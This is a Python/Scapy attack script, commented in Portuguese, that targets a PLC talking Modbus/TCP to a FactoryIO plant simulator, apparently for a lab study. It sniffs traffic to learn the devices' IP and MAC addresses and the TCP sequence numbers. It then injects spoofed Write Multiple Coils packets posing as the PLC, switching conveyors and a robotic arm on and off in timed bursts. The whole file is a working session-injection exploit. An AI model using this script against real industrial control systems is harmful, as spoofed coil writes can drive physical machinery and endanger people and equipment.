from scapy.all import *
from scapy.layers.inet import IP, TCP, Ether
import time
import sys
import random

#Iface Varia de acordo com a placa de rede utilizada, neste caso, é a placa de rede wireless do desktop, 
# dispositivo em que este código foi compilado.
iface_ = "Realtek Gaming 2.5GbE Family Controller"
loops_de_ataque = 2500

# ------------------------ CAPTURA DOS IPs E TAMANHO DO LOOP DE COMUNICAÇÃO ------------------------
print("------------------------ PROCURANDO IP's E TAMANHO DO LOOP ENTRE PLC E PLANTA")


function_codes = set()
transct_ids = set()
loop_msgs = []

# Função para identificar quando um ciclo completo de mensagens foi capturado
def parada_loop_completo(pkt):
    # Extrai o código de função e o ID de transação do pacote Modbus
    func_code = pkt[Raw].load[7]
    trans_id = (pkt[Raw].load[0] << 8) + pkt[Raw].load[1]
    # Verifica se já capturou um ciclo completo de mensagens
    if func_code in function_codes and not trans_id in transct_ids:
         return True
    else:
        function_codes.add(func_code)
        transct_ids.add(trans_id)
        loop_msgs.append(pkt)
        return False
    

# Captura pacotes Modbus/TCP para identificar IPs e ciclo de comunicação
LEITURA_PACOTES_MODBUS = sniff(
    iface=iface_,
    #Filtro para capturar apenas pacotes Modbus/TCP (Layer Raw se refere a dados da camada de aplicação (Modbus neste caso))
    lfilter=lambda x: x.haslayer(Raw) and x.haslayer(TCP) and \
        ((x[Raw].load[2] << 8) + (x[Raw].load[3]) == 0) and (x[TCP].dport == 502 or x[TCP].sport == 502),
    stop_filter=parada_loop_completo
)

# Descobre os IPs do FactoryIO e do CLP a partir dos pacotes capturados
for pkt in loop_msgs:
    if pkt[TCP].dport == 502:
        ip_factoryIO = pkt[IP].dst
        ip_CLP = pkt[IP].src
        MAC_factoryIO = pkt[Ether].dst
        MAC_CLP = pkt[Ether].src
        break

print(f"IP FactoryIO: {ip_factoryIO}")
print(f"IP CLP: {ip_CLP}")
print(f"MAC FactoryIO: {MAC_factoryIO}")
print(f"MAC CLP: {MAC_CLP}")    

# Calcula o tamanho do ciclo de comunicação
tamanho_do_loop = len(function_codes) #Quantidade de tipos de msg em um loop
print(f"Tamanho do loop de comunicação: {tamanho_do_loop} mensagens")

print("------------------------ IP's E TAMANHO DO LOOP ENCONTRADOS")

# ------------------------ INTERCEPTAÇÃO DOS PACOTES DE INTERESSE ------------------------
# Intercepta pacotes Write Multiple Coils enviados ao PLC
flag = 1
print("------------------------ DETECTANDO LOOP DE QUERRYS ENVIADOS AO PLC")
contador = 0

while flag: 
    PACOTES_INTERCEPTADOS = sniff(
        iface=iface_,
        count=tamanho_do_loop + 1,
        lfilter=lambda x: x.haslayer(Raw) and x.haslayer(IP) and x[IP].dst == ip_factoryIO
    )

    QUERRY_WRITE_COIL_a = PACOTES_INTERCEPTADOS[0]
    QUERRY_WRITE_COIL_b = PACOTES_INTERCEPTADOS[tamanho_do_loop]
    contador += 1

    try:
        # Verifica se os pacotes capturados são do tipo Write Multiple Coils
        if b'\x0f\x00\x00' in QUERRY_WRITE_COIL_a[Raw].load and b'\x0f\x00\x00' in QUERRY_WRITE_COIL_b[Raw].load:
            print("------------------------ LOOP DE QUERRY WMC DETECTADO")
            flag = 0
        if contador > 500:
            print("Não foi possível detectar o loop de querrys Write Multiple Coils. Tentando novamente...")
            time.sleep(1.5)
            contador = 0
    except:
        flag = 1

print("------------------------ CONSTRUINDO PACOTE DE ATAQUE")

# ------------------------ CÁLCULO DOS CAMPOS TCP PARA O PACOTE DE ATAQUE ------------------------
# Calcula os valores de sequência e reconhecimento para os pacotes de ataque
TAMANHO_SEQ = QUERRY_WRITE_COIL_b.seq - QUERRY_WRITE_COIL_a.seq
TAMANHO_ACK = QUERRY_WRITE_COIL_b.ack - QUERRY_WRITE_COIL_a.ack

SEQ_ATAQUE = (QUERRY_WRITE_COIL_b.seq + TAMANHO_SEQ)
ACK_ATAQUE = (QUERRY_WRITE_COIL_b.ack + TAMANHO_ACK)

# Vetor com valores sniffados do último querry
DADOS_LAYER_TPC = {
     'src': QUERRY_WRITE_COIL_b[IP].src,
     'dst': QUERRY_WRITE_COIL_b[IP].dst,
     'sport': QUERRY_WRITE_COIL_b[TCP].sport,
     'dport': QUERRY_WRITE_COIL_b[TCP].dport,
     'wnd': QUERRY_WRITE_COIL_b[TCP].window,
}

# Monta a camada IP/TCP do primeiro pacote de ataque
CAMADA_TCP_IP_PRIMEIRO_ATAQUE = IP(src=DADOS_LAYER_TPC['src'], dst=DADOS_LAYER_TPC['dst'])/ TCP(
    dport=DADOS_LAYER_TPC['dport'], 
    sport=DADOS_LAYER_TPC['sport'], seq=SEQ_ATAQUE, ack=ACK_ATAQUE, window=DADOS_LAYER_TPC['wnd'], 
    flags="PA"
)

# Camada Ethernet
CAMADA_ETHERNET = Ether(src=MAC_CLP, dst=MAC_factoryIO, type=0x0800)    

# ------------------------ CONSTRUÇÃO DAS LAYERS MODBUSTCP E MODBUS ------------------------
print("------------------------ CONSTRUINDO LAYERS MODBUS")

# Extrai e calcula os campos Modbus para o ataque
Trans_ID = ((QUERRY_WRITE_COIL_b[Raw].load[0] << 8) + QUERRY_WRITE_COIL_b[Raw].load[1]) + tamanho_do_loop
Unit_ID = QUERRY_WRITE_COIL_b[Raw].load[6]
WMC_FUNCTION =  QUERRY_WRITE_COIL_b[Raw].load[7]
Bit_Count = ((QUERRY_WRITE_COIL_b[Raw].load[10] << 8) + QUERRY_WRITE_COIL_b[Raw].load[11])
Byte_Count = QUERRY_WRITE_COIL_b[Raw].load[12]
Length = (QUERRY_WRITE_COIL_b[Raw].load[4] << 8) + QUERRY_WRITE_COIL_b[Raw].load[5]
Data = 25348 # Valor fixo para os dados do ataque (110110000010) (Esteiras on, stopblad off, braço 1 ON)

# Define as classes ModbusTCP e Modbus para montar os pacotes
class ModbusTCP(Packet):
     name = "MBPA"
     fields_desc = [ ShortField("Transaction_Identifier", Trans_ID),
                     ShortField("Protocol_Identifier", 0),
                     ShortField("Length", Length),
                     ByteField("Unit_Identifier", Unit_ID)
                     ]


class Modbus(Packet):
     name = "PDU"
     fields_desc = [ XByteField("Function_Code", WMC_FUNCTION),
                     ShortField("Reference_Number", 0),
                     ShortField("Bit_Count", Bit_Count),
                     ByteField("Byte_Count", Byte_Count),
                     ShortField("Data", Data)
                     ]

# ------------------------ ENVIO DOS PACOTES DE ATAQUE EM LOOP ------------------------
print("------------------------ CONCATENADO LAYERS E CONSTRUINDO PACOTE COMPLETO")

aux1 = 0
trans_id_atual = Trans_ID
contador =  1 #(vão ser 5 segundos de ataque a cada 15 segundos - contador 1 = 0,1s)
attack_values = [6916, 25348, 33541]

while aux1 < loops_de_ataque:
    if aux1 == 0:
        # Usa o que já foi construído fora do loop
        camada_ethernet = CAMADA_ETHERNET
        camada_tcp_ip = CAMADA_TCP_IP_PRIMEIRO_ATAQUE
        camada_modbus_tcp = ModbusTCP()
        camada_modbus = Modbus()
    else:

        if contador <= 50:
            contador += 1
        elif contador > 50 and contador <= 200:
            Data = 0
            contador += 1
        elif contador > 200:    
            contador = 0
            Data = random.choice(attack_values)
        # Recalcula valores para os próximos pacotes
        seq_atual = SEQ_ATAQUE + (TAMANHO_SEQ * aux1)
        ack_atual = ACK_ATAQUE + (TAMANHO_ACK * aux1)
        trans_id_atual = Trans_ID + (tamanho_do_loop * aux1)

        camada_tcp_ip = IP(src=DADOS_LAYER_TPC['src'], dst=DADOS_LAYER_TPC['dst']) / \
            TCP(dport=DADOS_LAYER_TPC['dport'], sport=DADOS_LAYER_TPC['sport'],
                seq=seq_atual, ack=ack_atual, window=DADOS_LAYER_TPC['wnd'], flags="PA")

        camada_modbus_tcp = ModbusTCP(Transaction_Identifier=trans_id_atual)
        camada_modbus = Modbus(Data=Data)

    # Monta o pacote completo (IP/TCP/ModbusTCP/Modbus)
    PACOTE_COMPLETO = camada_ethernet / camada_tcp_ip / camada_modbus_tcp / camada_modbus

    # Define o momento certo para enviar o pacote (após ler o último response antes de finalizar o loop)
    def parar_sniff_envio_pacote(pkt):
        Tran_ID_Anterior_Envio = (pkt[Raw].load[0] << 8) + pkt[Raw].load[1]
        if Tran_ID_Anterior_Envio == trans_id_atual - 1:
            return True
        return False

    sniff(
        iface=iface_,
        lfilter=lambda x: x.haslayer(Raw) and x.haslayer(IP) and x[IP].src == ip_factoryIO,
        stop_filter=parar_sniff_envio_pacote# prn = lambda x: x.show()
    )

    if aux1 == 0:
        print("------------------------ MOMENTO CERTO DETECTADO, PACOTES SENDO ENVIADOS")
        
    if Data != 0:
        # Envia o pacote de ataque
        sendp(PACOTE_COMPLETO, iface=iface_, verbose=0)


    sys.stdout.write(".")
    sys.stdout.flush()
    aux1 += 1

print("\n------------------------ ATAQUE FINALIADO")
#print("------------------------ DADOS DO PACOTE FINAL ENVIADO")
#PACOTE_COMPLETO.show()
#QUERRY_WRITE_COIL_b.show()


